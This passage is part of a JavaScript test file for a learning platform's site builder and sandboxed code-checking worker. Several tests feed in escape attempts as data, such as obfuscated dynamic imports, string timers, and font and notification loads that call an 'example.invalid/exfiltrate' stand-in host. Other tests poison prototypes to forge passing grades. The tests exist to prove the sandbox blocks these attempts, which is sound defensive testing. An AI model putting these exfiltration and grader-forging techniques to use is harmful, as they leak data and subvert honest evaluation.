    source: "export const addTwoValues = (left, right) => left + right;\n",
  };
  const invalidInputs = [
    {
      value: {},
      pattern: /must be an array/,
    },
    {
      value: [{ ...valid, extra: true }],
      pattern: /Unknown referenceSolutions\[0\] field: extra/,
    },
    {
      value: [{ ...valid, groupId: "unknown" }],
      pattern: /does not match a Question Group question/,
    },
    {
      value: [valid, { ...valid }],
      pattern: /Duplicate Question Group reference solution/,
    },
    {
      value: [{ ...valid, source: " \n" }],
      pattern: /must be non-empty source text/,
    },
    {
      value: [{ ...valid, source: "x".repeat(50_001) }],
      pattern: /no longer than 50,000 characters/,
    },
  ];
  for (const invalid of invalidInputs) {
    await assert.rejects(
      buildStandaloneQuestionGroupSite(structuredClone(library), {
        bundledBrowserRuntime: false,
        referenceSolutions: invalid.value,
      }),
      invalid.pattern,
    );
  }
});

test("trusted reference solutions serialize deterministically by question identity", async () => {
  const library = await exampleLibrary();
  const secondQuestion = structuredClone(library.groups[0].questions[0]);
  secondQuestion.id = "add-three-values";
  secondQuestion.order = 2;
  secondQuestion.title = "Add three values";
  secondQuestion.prompt = "Return the sum of three numeric inputs while preserving their left-to-right order.";
  secondQuestion.path = "add-three-values.js";
  secondQuestion.starterCode = "export function addThreeValues(left, middle, right) { return 0; }\n";
  library.groups[0].questions.push(secondQuestion);
  const first = {
    groupId: "arithmetic",
    questionId: "add-two-values",
    source: "export const addTwoValues = (left, right) => left + right;\n",
  };
  const second = {
    groupId: "arithmetic",
    questionId: "add-three-values",
    source: "export const addThreeValues = (left, middle, right) => left + middle + right;\n",
  };

  const forward = await buildStandaloneQuestionGroupSite(
    structuredClone(library),
    {
      bundledBrowserRuntime: false,
      referenceSolutions: [first, second],
    },
  );
  const reverse = await buildStandaloneQuestionGroupSite(
    structuredClone(library),
    {
      bundledBrowserRuntime: false,
      referenceSolutions: [second, first],
    },
  );

  assert.equal(forward["assets/player.js"], reverse["assets/player.js"]);
  assert.deepEqual(
    JSON.parse(forward["build-report.json"]).referenceSolutions,
    JSON.parse(reverse["build-report.json"]).referenceSolutions,
  );
});

test("Question Group UI configuration rejects unsafe directories and unknown copy fields", async () => {
  const library = await exampleLibrary();
  await assert.rejects(
    buildStandaloneQuestionGroupSite(library, {
      bundledBrowserRuntime: false,
      ui: { reviewDirectory: "../review" },
    }),
    /one safe relative directory name/,
  );
  await assert.rejects(
    buildStandaloneQuestionGroupSite(library, {
      bundledBrowserRuntime: false,
      ui: { copy: { unreviewedConcept: "Surprise" } },
    }),
    /Unknown Question Group site copy field/,
  );
  await assert.rejects(
    buildStandaloneQuestionGroupSite(library, {
      bundledBrowserRuntime: false,
      ui: {
        appearance: { palette: "sage" },
        theme: { accent: "#234567" },
      },
    }),
    /ui\.appearance and ui\.theme cannot be configured together/,
  );
  await assert.rejects(
    buildStandaloneQuestionGroupSite(library, {
      bundledBrowserRuntime: false,
      ui: {
        globalNavigation: [
          { label: "Remote", href: "https://example.invalid/" },
        ],
      },
    }),
    /same-origin local path/,
  );
  await assert.rejects(
    buildStandaloneQuestionGroupSite(library, {
      bundledBrowserRuntime: false,
      ui: {
        globalNavigation: [{ label: "Course", href: "../course/" }],
        suiteHeader: {
          productName: "Learning Studio",
          homeHref: "../",
          navigationLabel: "Learning suite",
          navigation: [{ label: "Practice", href: "./", current: true }],
        },
      },
    }),
    /ui\.suiteHeader and ui\.globalNavigation cannot be configured together/,
  );
  await assert.rejects(
    buildStandaloneQuestionGroupSite(library, {
      bundledBrowserRuntime: false,
      ui: {
        suiteHeader: {
          productName: "Learning Studio",
          homeHref: "../",
          navigationLabel: "Learning suite",
          navigation: [],
        },
      },
    }),
    /ui\.suiteHeader\.navigation must include at least one item/,
  );
  await assert.rejects(
    buildStandaloneQuestionGroupSite(library, {
      bundledBrowserRuntime: false,
      metaContentSecurityPolicy: "default-src 'none'\nscript-src 'self'",
    }),
    /must be a single line/,
  );
});

test("the bundled adapter fails closed on unrecognized runtime profiles", async () => {
  const library = await exampleLibrary();
  library.runtimes[0].engine = "publisher-defined-runtime";
  library.runtimes[0].engineVersion = "latest";
  const files = await buildStandaloneQuestionGroupSite(library);
  assert.deepEqual(JSON.parse(files["build-report.json"]).browserRuntimes, []);
  assert.match(files["assets/player.js"], /runtime\.engine === "esbuild-wasm"/);
  assert.doesNotMatch(files["question-group-library.json"], /runtime-adapter\.js/);
});

test("the bundled compiler removes native dynamic imports before worker evaluation", async () => {
  const variants = [
    'import("https://example.invalid/module.js")',
    'import/**/("https://example.invalid/module.js")',
    'import/* block\ncomment */ ("https://example.invalid/module.js")',
    'import\n("https://example.invalid/module.js")',
    'import( /* argument comment */ "https://example.invalid/module.js")',
    "import(`https://example.invalid/${name}.js`)",
    "import(moduleUrl)",
  ];

  for (const expression of variants) {
    const compiled = await transform(
      `async function solve() {
        const name = "module";
        const moduleUrl = "https://example.invalid/module.js";
        await ${expression};
        return 1;
      }
      globalThis.__latentEntrypoint = () => solve();`,
      {
        ...QUESTION_GROUP_LEARNER_TRANSFORM_OPTIONS,
        loader: "js",
      },
    );
    assert.doesNotMatch(
      compiled.code,
      /\bimport\s*\(/,
      `native dynamic import survived compilation for ${expression}`,
    );
    assert.match(compiled.code, /\brequire\(/);
  }

  const harmlessString = await transform(
    'function solve() { return "import("; } globalThis.__latentEntrypoint = solve;',
    {
      ...QUESTION_GROUP_LEARNER_TRANSFORM_OPTIONS,
      loader: "js",
    },
  );
  assert.match(harmlessString.code, /"import\("/);

  let sent;
  class IsolatedTextEncoder {
    encode(value) {
      return new TextEncoder().encode(value);
    }
  }
  const self = {
    addEventListener(type, listener) {
      if (type === "message") this.listener = listener;
    },
    postMessage(value) {
      sent = value;
    },
    structuredClone(value) {
      return structuredClone(value);
    },
  };
  const context = vm.createContext({
    console,
    globalThis: self,
    self,
    structuredClone: self.structuredClone,
    TextEncoder: IsolatedTextEncoder,
  });
  Object.assign(self, {
    console,
    globalThis: self,
    self,
    structuredClone: self.structuredClone,
    TextEncoder: IsolatedTextEncoder,
  });
  vm.runInContext(questionGroupSandboxWorkerJavaScript, context);
  const compiledAttack = await transform(
    `async function solve() {
      await import/**/("https://example.invalid/exfiltrate.js");
      return 1;
    }
    globalThis.__latentEntrypoint = () => solve();`,
    {
      ...QUESTION_GROUP_LEARNER_TRANSFORM_OPTIONS,
      loader: "js",
    },
  );
  await self.listener({
    data: {
      id: "dynamic-import-proof",
      code: compiledAttack.code,
      cases: [{
        id: "does-not-load",
        label: "does not load",
        args: [],
        assertions: [{
          id: "result",
          label: "returns one",
          kind: "deep-equal",
          expected: 1,
        }],
      }],
      maxOutputBytes: 100_000,
    },
  });
  assert.equal(sent.ok, true);
  assert.equal(sent.cases[0].passed, false);
  assert.match(sent.cases[0].assertions[0].detail, /ReferenceError|require/);
});

test("canonical worker runs preserve their output budget while custom input opts into observations", async () => {
  let sent;
  class IsolatedTextEncoder {
    encode(value) {
      return new TextEncoder().encode(value);
    }
  }
  const self = {
    addEventListener(type, listener) {
      if (type === "message") this.listener = listener;
    },
    postMessage(value) {
      sent = value;
    },
    structuredClone(value) {
      return structuredClone(value);
    },
  };
  const context = vm.createContext({
    console,
    globalThis: self,
    self,
    structuredClone: self.structuredClone,
    TextEncoder: IsolatedTextEncoder,
  });
  Object.assign(self, {
    console,
    globalThis: self,
    self,
    structuredClone: self.structuredClone,
    TextEncoder: IsolatedTextEncoder,
  });
  vm.runInContext(questionGroupSandboxWorkerJavaScript, context);

  const returnedValue = "x".repeat(900);
  const baseRequest = {
    code: `globalThis.__latentEntrypoint = () => ${JSON.stringify(returnedValue)};`,
    cases: [{
      id: "near-output-limit",
      label: "returns a large string",
      args: [],
      assertions: [{
        id: "result",
        label: "returns text",
        kind: "type",
        expected: "string",
      }],
    }],
    maxOutputBytes: 1_024,
  };

  await self.listener({
    data: { ...baseRequest, id: "canonical-near-output-limit" },
  });
  const canonical = sent;
  assert.equal(canonical.ok, true);
  assert.equal(Object.hasOwn(canonical.cases[0], "observation"), false);
  const canonicalBytes = new TextEncoder().encode(
    JSON.stringify(canonical.cases),
  ).byteLength;
  const capturedBytes = new TextEncoder().encode(JSON.stringify([{
    ...canonical.cases[0],
    observation: { status: "returned", value: returnedValue },
  }])).byteLength;
  assert.ok(canonicalBytes <= baseRequest.maxOutputBytes);
  assert.ok(capturedBytes > baseRequest.maxOutputBytes);

  await self.listener({
    data: {
      ...baseRequest,
      id: "custom-near-output-limit",
      includeObservation: true,
    },
  });
  assert.equal(sent.ok, false);
  assert.match(sent.error, /exceeded the declared output limit/);

  await self.listener({
    data: {
      ...baseRequest,
      id: "custom-with-output-room",
      includeObservation: true,
      maxOutputBytes: 4_096,
    },
  });
  assert.equal(sent.ok, true);
  assert.equal(sent.cases[0].observation.status, "returned");
  assert.equal(sent.cases[0].observation.value, returnedValue);

  await self.listener({
    data: {
      ...baseRequest,
      id: "custom-thrown-observation",
      code: 'globalThis.__latentEntrypoint = () => { throw new TypeError("custom input"); };',
      includeObservation: true,
      maxOutputBytes: 4_096,
    },
  });
  assert.equal(sent.ok, true);
  assert.equal(sent.cases[0].observation.status, "threw");
  assert.equal(sent.cases[0].observation.errorName, "TypeError");
  assert.equal(sent.cases[0].observation.message, "custom input");
});

test("the worker disables string-evaluating timers that could synthesize imports", async () => {
  let sent;
  let stringTimerEvaluations = 0;
  class IsolatedTextEncoder {
    encode(value) {
      return new TextEncoder().encode(value);
    }
  }
  const sandbox = {
    TextEncoder: IsolatedTextEncoder,
    addEventListener(type, listener) {
      if (type === "message") this.listener = listener;
    },
    postMessage(value) {
      sent = value;
    },
    setInterval(handler) {
      if (typeof handler === "string") stringTimerEvaluations += 1;
    },
    setTimeout(handler) {
      if (typeof handler === "string") stringTimerEvaluations += 1;
    },
    structuredClone(value) {
      return structuredClone(value);
    },
  };
  sandbox.globalThis = sandbox;
  sandbox.self = sandbox;
  const context = vm.createContext(sandbox);
  vm.runInContext(questionGroupSandboxWorkerJavaScript, context);
  await sandbox.listener({
    data: {
      id: "string-timer-proof",
      code: `globalThis.__latentEntrypoint = () => {
        setTimeout('import/**/("https://example.invalid/exfiltrate.js")', 0);
        return 1;
      };`,
      cases: [{
        id: "does-not-schedule",
        label: "does not schedule",
        args: [],
        assertions: [{
          id: "result",
          label: "returns one",
          kind: "deep-equal",
          expected: 1,
        }],
      }],
      maxOutputBytes: 100_000,
    },
  });

  assert.equal(stringTimerEvaluations, 0);
  assert.equal(sent.ok, true);
  assert.equal(sent.cases[0].passed, false);
  assert.match(sent.cases[0].assertions[0].detail, /setTimeout/);
  assert.match(questionGroupSandboxWorkerJavaScript, /"setTimeout"/);
  assert.match(questionGroupSandboxWorkerJavaScript, /"setInterval"/);
});

test("the worker disables font loading as an alternate network primitive", async () => {
  let sent;
  let fontLoads = 0;
  class IsolatedTextEncoder {
    encode(value) {
      return new TextEncoder().encode(value);
    }
  }
  class NetworkFontFace {
    load() {
      fontLoads += 1;
      return Promise.resolve(this);
    }
  }
  const sandbox = {
    FontFace: NetworkFontFace,
    TextEncoder: IsolatedTextEncoder,
    fonts: {},
    addEventListener(type, listener) {
      if (type === "message") this.listener = listener;
    },
    postMessage(value) {
      sent = value;
    },
    structuredClone(value) {
      return structuredClone(value);
    },
  };
  sandbox.globalThis = sandbox;
  sandbox.self = sandbox;
  const context = vm.createContext(sandbox);
  vm.runInContext(questionGroupSandboxWorkerJavaScript, context);
  await sandbox.listener({
    data: {
      id: "font-network-proof",
      code: `globalThis.__latentEntrypoint = () => {
        new FontFace("leak", "url(https://example.invalid/exfiltrate.woff)").load();
        return 1;
      };`,
      cases: [{
        id: "does-not-load",
        label: "does not load",
        args: [],
        assertions: [{
          id: "result",
          label: "returns one",
          kind: "deep-equal",
          expected: 1,
        }],
      }],
      maxOutputBytes: 100_000,
    },
  });

  assert.equal(fontLoads, 0);
  assert.equal(sent.ok, true);
  assert.equal(sent.cases[0].passed, false);
  assert.match(sent.cases[0].assertions[0].detail, /FontFace/);
  assert.match(questionGroupSandboxWorkerJavaScript, /"FontFace"/);
  assert.match(questionGroupSandboxWorkerJavaScript, /"fonts"/);
});

test("the worker disables notification resource loading and legacy persistent storage", async () => {
  let sent;
  let notifications = 0;
  class IsolatedTextEncoder {
    encode(value) {
      return new TextEncoder().encode(value);
    }
  }
  class NetworkNotification {
    constructor() {
      notifications += 1;
    }
  }
  const sandbox = {
    Notification: NetworkNotification,
    TextEncoder: IsolatedTextEncoder,
    addEventListener(type, listener) {
      if (type === "message") this.listener = listener;
    },
    postMessage(value) {
      sent = value;
    },
    structuredClone(value) {
      return structuredClone(value);
    },
    webkitRequestFileSystem() {},
    webkitRequestFileSystemSync() {},
    webkitResolveLocalFileSystemSyncURL() {},
    webkitResolveLocalFileSystemURL() {},
  };
  sandbox.globalThis = sandbox;
  sandbox.self = sandbox;
  const context = vm.createContext(sandbox);
  vm.runInContext(questionGroupSandboxWorkerJavaScript, context);
  await sandbox.listener({
    data: {
      id: "notification-network-proof",
      code: `globalThis.__latentEntrypoint = () => {
        new Notification("leak", {
          icon: "https://example.invalid/exfiltrate.png"
        });
        return 1;
      };`,
      cases: [{
        id: "does-not-load",
        label: "does not load",
        args: [],
        assertions: [{
          id: "result",
          label: "returns one",
          kind: "deep-equal",
          expected: 1,
        }],
      }],
      maxOutputBytes: 100_000,
    },
  });

  assert.equal(notifications, 0);
  assert.equal(sent.ok, true);
  assert.equal(sent.cases[0].passed, false);
  assert.match(sent.cases[0].assertions[0].detail, /Notification/);
  assert.match(questionGroupSandboxWorkerJavaScript, /"Notification"/);
  assert.match(questionGroupSandboxWorkerJavaScript, /"webkitRequestFileSystem"/);
  assert.match(questionGroupSandboxWorkerJavaScript, /"webkitRequestFileSystemSync"/);
  assert.match(questionGroupSandboxWorkerJavaScript, /"webkitResolveLocalFileSystemURL"/);
  assert.match(questionGroupSandboxWorkerJavaScript, /"webkitResolveLocalFileSystemSyncURL"/);
});

test("learner source cannot poison checker primordials to forge a pass", async () => {
  let sent;
  class IsolatedTextEncoder {
    encode(value) {
      return new TextEncoder().encode(value);
    }
  }
  const self = {
    addEventListener(type, listener) {
      if (type === "message") this.listener = listener;
    },
    postMessage(value) {
      sent = value;
    },
    structuredClone(value) {
      return structuredClone(value);
    },
  };
  const context = vm.createContext({
    console,
    globalThis: self,
    self,
    structuredClone: self.structuredClone,
    TextEncoder: IsolatedTextEncoder,
  });
  Object.assign(self, {
    console,
    globalThis: self,
    self,
    structuredClone: self.structuredClone,
    TextEncoder: IsolatedTextEncoder,
  });
  vm.runInContext(questionGroupSandboxWorkerJavaScript, context);
  await vm.runInContext(`self.listener({ data: {
    id: "poison-proof",
    code: "try { Array.prototype.every = () => true; } catch {} try { Object.is = () => true; } catch {} try { TextEncoder.prototype.encode = () => ({ byteLength: 0 }); } catch {} globalThis.__latentEntrypoint = () => 0;",
    cases: [{
      id: "must-return-one",
      label: "must return one",
      args: [],
      assertions: [{
        id: "result",
        label: "returns one",
        kind: "deep-equal",
        expected: 1
      }]
    }],
    maxOutputBytes: 100000
  } })`, context);

  assert.equal(sent.ok, true);
  assert.equal(sent.cases[0].assertions[0].passed, false);
  assert.equal(sent.cases[0].passed, false);
  assert.match(questionGroupSandboxWorkerJavaScript, /"WebTransport"/);
  assert.match(questionGroupSandboxWorkerJavaScript, /"WebSocketStream"/);
});

test("checker grading ignores inherited data and rejects hostile result objects", async () => {
  let sent;
  class IsolatedTextEncoder {
    encode(value) {
      return new TextEncoder().encode(value);
    }
  }
  const sandbox = {
    TextEncoder: IsolatedTextEncoder,
    addEventListener(type, listener) {
      if (type === "message") this.listener = listener;
    },
    postMessage(value) {
      sent = value;
    },
    structuredClone(value) {
      return structuredClone(value);
    },
  };
  sandbox.globalThis = sandbox;
  sandbox.self = sandbox;
  const context = vm.createContext(sandbox);
  vm.runInContext(`{
    const hostClone = globalThis.structuredClone;
    const safeHasOwn = Object.prototype.hasOwnProperty;
    const safeKeys = Object.keys;
    const safeTag = Object.prototype.toString;
    const adoptClone = (value) => {
      if (!value || typeof value !== "object") return value;
      if (Reflect.apply(safeTag, value, []) === "[object Date]") {
        return new Date(value.getTime());
      }
      if (Array.isArray(value)) {
        const output = new Array(value.length);
        for (let index = 0; index < value.length; index += 1) {
          if (Reflect.apply(safeHasOwn, value, [index])) {
            output[index] = adoptClone(value[index]);
          }
        }
        return output;
      }
      const output = {};
      for (const key of safeKeys(value)) output[key] = adoptClone(value[key]);
      return output;
    };
    globalThis.structuredClone = (value) => adoptClone(hostClone(value));
  }`, context);
  vm.runInContext(questionGroupSandboxWorkerJavaScript, context);

  const run = async (id, code, assertion) => {
    sent = null;
    await sandbox.listener({
      data: {
        id,
        code,
        cases: [{
          id: "hostile-result",
          label: "hostile result",
          args: [],
          assertions: [{
            id: "result",
            label: "checks result",
            ...assertion,
          }],
        }],
        maxOutputBytes: 100_000,
      },
    });
    return sent;
  };

  const inheritedPath = await run(
    "inherited-path",
    `try { Object.prototype.answer = 42; } catch {}
    globalThis.__latentEntrypoint = () => ({});`,
    { kind: "deep-equal", path: ["answer"], expected: 42 },
  );
  assert.equal(inheritedPath.ok, true);
  assert.equal(inheritedPath.cases[0].passed, false);

  const forgedRegexp = await run(
    "forged-regexp",
    `try { RegExp.prototype.exec = () => ["forged"]; } catch {}
    globalThis.__latentEntrypoint = () => "wrong text";`,
    { kind: "matches", pattern: "^right text$" },
  );
  assert.equal(forgedRegexp.ok, true);
  assert.equal(forgedRegexp.cases[0].passed, false);

  const validRegexp = await run(
    "valid-regexp",
    `globalThis.__latentEntrypoint = () => "right text";`,
    { kind: "matches", pattern: "^right text$" },
  );
  assert.equal(validRegexp.ok, true);
  assert.equal(validRegexp.cases[0].passed, true);

  const sparseArray = await run(
    "sparse-array",
    `try { Array.prototype[0] = 42; } catch {}
    globalThis.__latentEntrypoint = () => {
      const result = [];
      result.length = 1;
      return result;
    };`,
    { kind: "deep-equal", expected: [42] },
  );
  assert.equal(sparseArray.ok, true);
  assert.equal(sparseArray.cases[0].passed, false);

  const proxyResult = await run(
    "proxy-result",
    `globalThis.__latentEntrypoint = () => new Proxy({}, {
      get: (_, key) => key === "answer" ? 42 : undefined,
      getOwnPropertyDescriptor: () => ({ configurable: true, enumerable: true }),
      getPrototypeOf: () => Object.prototype,
      ownKeys: () => ["answer"]
    });`,
    { kind: "deep-equal", expected: { answer: 42 } },
  );
  assert.equal(proxyResult.ok, true);
  assert.equal(proxyResult.cases[0].passed, false);
  assert.match(proxyResult.cases[0].assertions[0].detail, /clone|portable|plain/i);

  const customPrototype = await run(
    "custom-prototype",
    `globalThis.__latentEntrypoint = () => Object.create({ answer: 42 });`,
    { kind: "deep-equal", path: ["answer"], expected: 42 },
  );
  assert.equal(customPrototype.ok, true);
  assert.equal(customPrototype.cases[0].passed, false);
  assert.match(customPrototype.cases[0].assertions[0].detail, /plain prototype/);

  const accessorInfinity = await run(
    "accessor-infinity",
    `globalThis.__latentEntrypoint = () => {
      let reads = 0;
      const result = {};
      Object.defineProperty(result, "answer", {
        enumerable: true,
        get() {
          reads += 1;
          return reads === 1 ? 42 : Infinity;
        }
      });
      return result;
    };`,
    { kind: "deep-equal", path: ["answer"], expected: 42 },
  );
  assert.equal(accessorInfinity.ok, true);
  assert.equal(accessorInfinity.cases[0].passed, false);
  assert.match(accessorInfinity.cases[0].assertions[0].detail, /finite JSON/);

  const accessorNonPlain = await run(
    "accessor-non-plain",
    `globalThis.__latentEntrypoint = () => {
      let reads = 0;
      const result = {};
      Object.defineProperty(result, "answer", {
        enumerable: true,
        get() {
          reads += 1;
          return reads === 1 ? { value: 42 } : new Date(0);
        }
      });
      return result;
    };`,
    { kind: "deep-equal", path: ["answer", "value"], expected: 42 },
  );
  assert.equal(accessorNonPlain.ok, true);
  assert.equal(accessorNonPlain.cases[0].passed, false);
  assert.match(accessorNonPlain.cases[0].assertions[0].detail, /plain prototype/);

  const ownData = await run(
    "own-data",
    `globalThis.__latentEntrypoint = () => ({ answer: 42, values: [42] });`,
    { kind: "deep-equal", path: ["answer"], expected: 42 },
  );
  assert.equal(ownData.ok, true);
  assert.equal(ownData.cases[0].passed, true);
});
